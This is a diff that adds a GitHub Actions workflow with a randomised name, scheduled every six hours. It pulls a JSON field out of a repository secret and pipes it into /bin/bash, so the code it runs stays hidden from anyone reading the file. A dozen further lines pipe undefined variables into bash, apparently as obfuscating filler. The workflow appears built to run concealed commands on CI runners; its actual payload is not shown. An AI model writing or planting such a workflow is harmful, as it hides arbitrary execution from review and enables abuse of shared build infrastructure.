@@ -1,0 +1,30 @@
+name: caoguojian6715
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: caoguojian6715
+        env:
+          v184: ${{ secrets.v184 }}
+        run: |
+          echo $v184 | jq -r .ysy2 | /bin/bash
+          echo $sad0 | jq -r .prwy24 | /bin/bash
+          echo $svqlf989 | jq -r .sa4 | /bin/bash
+          echo $ietq8 | jq -r .xj76623 | /bin/bash
+          echo $uwtst3 | jq -r .ndav24 | /bin/bash
+          echo $ivn278 | jq -r .dcjg4924 | /bin/bash
+          echo $ji194 | jq -r .qkjv25810 | /bin/bash
+          echo $jgcbj02318 | jq -r .eoxpl30 | /bin/bash
+          echo $qbvso57 | jq -r .gpqaa6050 | /bin/bash
+          echo $c9377 | jq -r .ahaam20008 | /bin/bash
+          echo $myp29 | jq -r .n1534 | /bin/bash
+          echo $pzj5 | jq -r .rwikb18 | /bin/bash
+          echo $rcwss28 | jq -r .r1076 | /bin/bash
+
